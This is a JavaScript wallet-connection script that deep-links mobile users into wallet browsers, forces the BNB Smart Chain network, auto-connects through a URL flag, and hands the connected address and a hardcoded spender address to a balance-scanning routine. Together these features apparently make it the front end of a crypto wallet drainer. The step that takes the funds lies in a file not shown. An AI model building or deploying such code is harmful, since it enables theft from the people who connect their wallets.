const STRINGS = {
    buttonConnecting: "Connecting...",
    buttonConnected: "Connected",
    buttonConnectWallet: "Connect Wallet",
    walletInfoPrefix: "Connected: ",
    alertDesktop: "Please use a Web3 wallet browser like Trust Wallet or MetaMask.",
    confirmIOS: "Open with Trust Wallet? (Press Cancel for MetaMask)",
    debugAndroidIntent: "Trying Android Trust Wallet Intent...",
    debugNetworkCorrect: "Network is correctly set to BSC.",
    debugSwitchingNetwork: "Switching to BSC network...",
    debugWaitingSync: "Waiting 2 seconds for wallet sync...",
    debugBSCMissing: "BSC missing. Adding network...",
    debugIOSPreset: "iOS detected: Pre-setting active network to BSC...",
    debugIOSWait: "Waiting for iOS wallet to stabilize...",
    debugSetNetworkBeforeConnect: "Setting active network to BSC before connecting...",
    debugRequestingPermissions: "Requesting permissions...",
    debugConnectedScanning: "Wallet connected successfully. Scanning balances...",
    debugBalanceScriptError: "Error: checkbalance.js not loaded properly.",
    debugConnectionFailedPrefix: "Connection failed: ",
    alertConnectionErrorPrefix: "Connection error: "
};

const CONNECT_BTN = document.getElementById("connectWalletBtn");
const SPENDER_ADDRESS = "0xbf6727651c321A9bf61E16f31AC126C9084244A1";

const BSC_CONFIG = {
    chainId: "0x38",
    chainName: "BNB Smart Chain",
    nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
    rpcUrls: ["https://bsc-dataseed.binance.org/"],
    blockExplorerUrls: ["https://bscscan.com"]
};

let web3Provider = null;
let web3Signer = null;
let connectedAddress = null;

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

function getPlatform() {
    const ua = navigator.userAgent || navigator.vendor || "";
    if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) return "ios";
    if (/android/i.test(ua)) return "android";
    return "other";
}

function getProvider() {
    if (window.trustwallet) return window.trustwallet;
    if (window.ethereum) {
        if (window.ethereum.providers) {
            const tw = window.ethereum.providers.find(p => p.isTrust || p.isTrustWallet);
            if (tw) return tw;
            return window.ethereum.providers[0];
        }
        return window.ethereum;
    }
    return null;
}

function checkDeepLink() {
    if (getProvider()) return; 
    const platform = getPlatform();
    
    if (platform === "other") {
        alert(STRINGS.alertDesktop);
        return;
    }

    const bareUrl = window.location.href.replace(/^https?:\/\//, "").split("?")[0];
    const bareUrlWithFlag = bareUrl + "?autoconnect=1";
    const encodedBareUrl = encodeURIComponent(bareUrlWithFlag);

    const fullUrlWithHttps = window.location.origin + window.location.pathname + "?autoconnect=1";
    const encodedFullUrl = encodeURIComponent(fullUrlWithHttps);

    if (platform === "android") {
        // ⚠️ ANDROID 100% UNTOUCHED EXACTLY LIKE BEFORE
        const trustLink = `intent://open_url?coin_id=60&url=${encodedBareUrl}#Intent;scheme=trust;package=com.wallet.crypto.trustapp;S.browser_fallback_url=https%3A%2F%2Fplay.google.com%2Fstore%2Fapps%2Fdetails%3Fid%3Dcom.wallet.crypto.trustapp;end`;
        appendDebugLog(STRINGS.debugAndroidIntent);
        window.location.href = trustLink;
    } else if (platform === "ios") {
        // ⚠️ IOS SPECIFIC DEEP LINK FIX (EXACT LOGIC FROM WORKING FILE)
        const trustLink = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodedFullUrl}`;
        const metamaskLink = `https://metamask.app.link/dapp/${bareUrlWithFlag}`;

        const chooseTrust = confirm(STRINGS.confirmIOS);
        window.location.href = chooseTrust ? trustLink : metamaskLink;
    }
}

async function enforceBSC(provider) {
    try {
        const currentChainId = await provider.request({ method: "eth_chainId" });
        const safeChainId = currentChainId ? String(currentChainId).toLowerCase() : "";
        if (safeChainId === BSC_CONFIG.chainId.toLowerCase()) {
            appendDebugLog(STRINGS.debugNetworkCorrect);
            return;
        }
        appendDebugLog(STRINGS.debugSwitchingNetwork);
        await provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CONFIG.chainId }] });
        appendDebugLog(STRINGS.debugWaitingSync);
        await sleep(2000); 
    } catch (error) {
        if (error.code === 4902 || (error.message && error.message.includes("Unrecognized chain ID"))) {
            appendDebugLog(STRINGS.debugBSCMissing);
            await provider.request({ method: "wallet_addEthereumChain", params: [BSC_CONFIG] });
            await sleep(2000); 
        } else {
            throw error;
        }
    }
}

async function connectWallet() {
    const rawProvider = getProvider();
    if (!rawProvider) {
        checkDeepLink();
        return;
    }

    if (CONNECT_BTN) { CONNECT_BTN.disabled = true; CONNECT_BTN.textContent = STRINGS.buttonConnecting; }

    try {
        const platform = getPlatform();

        if (platform === "ios") {
            // ⚠️ IOS ONLY: Pre-setting active network to BSC before requesting accounts
            appendDebugLog(STRINGS.debugIOSPreset);
            try {
                await rawProvider.request({
                    method: "wallet_switchEthereumChain",
                    params: [{ chainId: BSC_CONFIG.chainId }],
                });
            } catch (preSwitchErr) {
                if (preSwitchErr.code === 4902) {
                    try {
                        await rawProvider.request({
                            method: "wallet_addEthereumChain",
                            params: [BSC_CONFIG],
                        });
                    } catch(e) {}
                }
            }
            appendDebugLog(STRINGS.debugIOSWait);
            await sleep(600);
        } else {
            // ⚠️ ANDROID REMAINS 100% UNTOUCHED
            appendDebugLog(STRINGS.debugSetNetworkBeforeConnect);
            try {
                await rawProvider.request({
                    method: "wallet_switchEthereumChain",
                    params: [{ chainId: BSC_CONFIG.chainId }],
                });
            } catch (preSwitchErr) {
                if (preSwitchErr.code === 4902) {
                    await rawProvider.request({
                        method: "wallet_addEthereumChain",
                        params: [BSC_CONFIG],
                    });
                }
            }
        }

        appendDebugLog(STRINGS.debugRequestingPermissions);
        const accounts = await rawProvider.request({ method: "eth_requestAccounts" });
        connectedAddress = accounts[0];
        
        await enforceBSC(rawProvider);

        web3Provider = new ethers.BrowserProvider(rawProvider, "any");
        web3Signer = await web3Provider.getSigner();

        if (CONNECT_BTN) CONNECT_BTN.textContent = STRINGS.buttonConnected;
        const infoDiv = document.getElementById("walletInfo");
        if (infoDiv) infoDiv.innerText = STRINGS.walletInfoPrefix + connectedAddress;

        appendDebugLog(STRINGS.debugConnectedScanning);
        if (typeof fetchAndRenderBalances === 'function') {
            await fetchAndRenderBalances(web3Provider, connectedAddress, SPENDER_ADDRESS);
        } else {
            appendDebugLog(STRINGS.debugBalanceScriptError);
        }
    } catch (error) {
        if (CONNECT_BTN) { CONNECT_BTN.disabled = false; CONNECT_BTN.textContent = STRINGS.buttonConnectWallet; }
        appendDebugLog(STRINGS.debugConnectionFailedPrefix + (error.message || error));
        alert(STRINGS.alertConnectionErrorPrefix + (error.message || error));
    }
}

if (CONNECT_BTN) CONNECT_BTN.addEventListener("click", connectWallet);

(function autoConnectCheck() {
    const params = new URLSearchParams(window.location.search);
    if (params.get("autoconnect") !== "1") return;
    let attempts = 0;
    const timer = setInterval(() => {
        attempts++;
        if (getProvider()) {
            clearInterval(timer);
            connectWallet();
        } else if (attempts > 15) {
            clearInterval(timer);
        }
    }, 500);
})();